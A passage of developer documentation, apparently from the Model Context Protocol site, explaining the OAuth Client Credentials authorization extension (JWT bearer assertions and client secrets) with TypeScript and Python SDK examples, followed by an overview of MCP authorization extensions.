* **CI/CD pipelines** invoke MCP servers as part of automated build, test, or deployment workflows
* **Server-to-server integrations** connect two backend systems where there's no end user involved
* **Daemon processes** or long-running workers need persistent access to MCP resources

If your integration has a human user who should explicitly authorize access, use the standard MCP authorization flow instead.

## How it works

The extension supports two credential formats:

### JWT Bearer Assertions (recommended)

Defined in [RFC 7523](https://datatracker.ietf.org/doc/html/rfc7523), JWT Bearer Assertions let the client sign a token with its private key and present it as proof of identity. The authorization server validates the signature using the client's registered public key.

```mermaid 
sequenceDiagram
    participant Client
    participant AS as Authorization Server
    participant MCP as MCP Server

    Client->>AS: POST /token<br/>grant_type=urn:ietf:params:<br/>oauth:grant-type:jwt-bearer<br/>assertion=<signed JWT>
    AS-->>Client: access_token
    Client->>MCP: MCP request (Bearer token)
```

The JWT assertion typically includes:

* `iss`: Client ID (the issuer)
* `sub`: Client ID (subject being authenticated)
* `aud`: Authorization server token endpoint URL
* `exp`: Expiration time
* `iat`: Issued-at time

### Client Secrets

For simpler deployments, the extension also supports the standard client credentials flow using a `client_id` and `client_secret`. The client sends its credentials directly to the authorization server's token endpoint and receives an access token in return.

```mermaid 
sequenceDiagram
    participant Client
    participant AS as Authorization Server
    participant MCP as MCP Server

    Client->>AS: POST /token<br/>grant_type=client_credentials<br/>client_id + client_secret
    AS-->>Client: access_token
    Client->>MCP: MCP request (Bearer token)
```

  Client secrets are **long-lived credentials** that grant access without user interaction. If a secret is leaked, an attacker can silently authenticate as your application until the secret is rotated. To reduce risk:

  * Store secrets in a secrets manager, never in source code or environment files checked into version control.
  * Rotate secrets on a regular schedule and immediately after any suspected compromise.
  * Scope credentials to the minimum permissions required.
  * Prefer JWT assertions when possible — they are short-lived and do not require transmitting the signing key.

## Implementation guide

### For MCP clients

To use the OAuth Client Credentials extension, your client must:

  
    Include the extension in the `initialize` request capabilities:

    ```json 
    {
      "capabilities": {
        "extensions": {
          "io.modelcontextprotocol/oauth-client-credentials": {}
        }
      }
    }
    ```
  

  
    Request a token from the authorization server using the client credentials grant before connecting to the MCP server.
  

  
    Pass the token in the `Authorization` header of HTTP requests to the MCP server:

    ```
    Authorization: Bearer <access_token>
    ```
  

  
    Client credentials tokens typically have shorter lifetimes than user-delegated tokens. Implement token refresh logic to obtain a new token before expiry.
  

### For MCP servers

To accept client credentials tokens, your server must:

  
    On each request, verify the JWT signature and claims against your authorization server's public keys (usually via a JWKS endpoint).
  

  
    Ensure the token includes the required scopes for the requested operation.
  

  
    Optionally (but recommended for discoverability), include the extension in the `initialize` response:

    ```json 
    {
      "capabilities": {
        "extensions": {
          "io.modelcontextprotocol/oauth-client-credentials": {}
        }
      }
    }
    ```
  

## SDK examples

The official MCP SDKs provide built-in support for client credentials authentication. Both handle token acquisition and refresh automatically.

  
    
      
        ```bash 
        npm install @modelcontextprotocol/client
        ```
      

      
        ```bash 
        pip install mcp
        ```
      
    
  

  
    Choose the credential format that matches your setup:

    #### Using a client secret

    
      
        ```typescript 
        import {
          Client,
          ClientCredentialsProvider,
          StreamableHTTPClientTransport,
        } from "@modelcontextprotocol/client";

        const provider = new ClientCredentialsProvider({
          clientId: "my-service",
          clientSecret: "s3cr3t",
        });

        const client = new Client(
          { name: "my-service", version: "1.0.0" },
          { capabilities: {} },
        );

        const transport = new StreamableHTTPClientTransport(
          new URL("https://mcp.example.com/mcp"),
          { authProvider: provider },
        );

        await client.connect(transport);

        // Use the client
        const tools = await client.listTools();
        console.log(
          "Available tools:",
          tools.tools.map((t) => t.name),
        );

        await transport.close();
        ```
      

      
        ```python 
        from mcp.client.auth.extensions.client_credentials import (
            ClientCredentialsOAuthProvider,
        )
        from mcp.client.streamable_http import streamablehttp_client
        from mcp import ClientSession

        provider = ClientCredentialsOAuthProvider(
            server_url="https://mcp.example.com/mcp",
            client_id="my-service",
            client_secret="s3cr3t",
            scopes="read write",
        )

        async with streamablehttp_client(
            "https://mcp.example.com/mcp",
            auth_provider=provider,
        ) as (read_stream, write_stream, _):
            async with ClientSession(read_stream, write_stream) as session:
                await session.initialize()

                # Use the client
                tools = await session.list_tools()
                print("Available tools:", [t.name for t in tools.tools])
        ```
      
    

    #### Using a JWT private key

    
      
        ```typescript 
        import {
          Client,
          PrivateKeyJwtProvider,
          StreamableHTTPClientTransport,
        } from "@modelcontextprotocol/client";

        const provider = new PrivateKeyJwtProvider({
          clientId: "my-service",
          privateKey: process.env.CLIENT_PRIVATE_KEY_PEM,
          algorithm: "RS256",
        });

        const client = new Client(
          { name: "my-service", version: "1.0.0" },
          { capabilities: {} },
        );

        const transport = new StreamableHTTPClientTransport(
          new URL("https://mcp.example.com/mcp"),
          { authProvider: provider },
        );

        await client.connect(transport);

        // Use the client
        const tools = await client.listTools();
        console.log(
          "Available tools:",
          tools.tools.map((t) => t.name),
        );

        await transport.close();
        ```
      

      
        ```python 
        from mcp.client.auth.extensions.client_credentials import (
            PrivateKeyJWTOAuthProvider,
            SignedJWTParameters,
        )
        from mcp.client.streamable_http import streamablehttp_client
        from mcp import ClientSession

        # Create a signed JWT assertion provider from key parameters
        jwt_params = SignedJWTParameters(
            issuer="my-service",
            subject="my-service",
            signing_key=open("private_key.pem").read(),
            signing_algorithm="RS256",
            lifetime_seconds=300,
        )

        provider = PrivateKeyJWTOAuthProvider(
            server_url="https://mcp.example.com/mcp",
            client_id="my-service",
            assertion_provider=jwt_params.create_assertion_provider(),
            scopes="read write",
        )

        async with streamablehttp_client(
            "https://mcp.example.com/mcp",
            auth_provider=provider,
        ) as (read_stream, write_stream, _):
            async with ClientSession(read_stream, write_stream) as session:
                await session.initialize()

                # Use the client
                tools = await session.list_tools()
                print("Available tools:", [t.name for t in tools.tools])
        ```
      
    
  

## Client support

  Support for this extension varies by client. Extensions are opt-in and never active by default.

Check the [client matrix](/extensions/client-matrix) for current implementation status across MCP clients.

## Related resources

  
    Source code and reference implementations
  

  
    Technical specification with normative requirements
  

  
    The underlying OAuth 2.0 specification
  

  
    JWT assertion format specification
  

# Authorization Extensions
Source: https://modelcontextprotocol.io/extensions/auth/overview

Supplementary authorization mechanisms for the Model Context Protocol

The [ext-auth repository](https://github.com/modelcontextprotocol/ext-auth) contains official MCP extensions that add authorization capabilities beyond the core MCP specification. These extensions address specific real-world scenarios where the standard OAuth 2.0 authorization code flow isn't the right fit.

  Source code, specifications, and reference implementations for MCP
  authorization extensions.

## Why authorization extensions?

The core MCP specification includes a robust [authorization framework](/specification/latest/basic/authorization) built on OAuth 2.0. That framework handles the common case well: a user interactively grants an MCP client permission to access a server on their behalf.

But not every MCP deployment fits this pattern:

* **Machine-to-machine integrations** don't have a human in the loop. Background services, CI pipelines, and automated workflows need to authenticate without interactive user consent flows.
* **Enterprise environments** often have centralized identity providers (IdPs) that enforce policy across all applications. Requiring employees to authorize each MCP server individually creates friction and bypasses existing security controls.

The ext-auth extensions address these gaps.

## Available extensions

  
    Machine-to-machine authentication using the OAuth 2.0 client credentials
    flow. No user interaction required.
  

  
    Centralized access control via enterprise identity providers. Employees
    access MCP servers through their organization's IdP.
  

## Choosing the right extension

| Scenario                                             | Recommended extension                                                                 |
| ---------------------------------------------------- | ------------------------------------------------------------------------------------- |
| Background service or daemon accessing an MCP server | [OAuth Client Credentials](/extensions/auth/oauth-client-credentials)                 |
| CI/CD pipeline calling MCP tools                     | [OAuth Client Credentials](/extensions/auth/oauth-client-credentials)                 |
| Server-to-server API integration                     | [OAuth Client Credentials](/extensions/auth/oauth-client-credentials)                 |
| Enterprise employees accessing MCP servers at work   | [Enterprise-Managed Authorization](/extensions/auth/enterprise-managed-authorization) |
| Organization-wide MCP access policy enforcement      | [Enterprise-Managed Authorization](/extensions/auth/enterprise-managed-authorization) |
| Standard interactive user authorization              | Core MCP spec (no extension needed)                                                   |

## Client support

Authorization extension support varies by client. See the [client matrix](/extensions/client-matrix) for a full breakdown. Both extensions require explicit support from the MCP client — they are never active by default.

## Specification

Both extensions are specified in the [ext-auth repository](https://github.com/modelcontextprotocol/ext-auth/tree/main/specification/draft). They use the standard MCP [extension negotiation](/extensions/overview#negotiation) mechanism: clients and servers declare support in the `extensions` field of their capabilities during initialization.
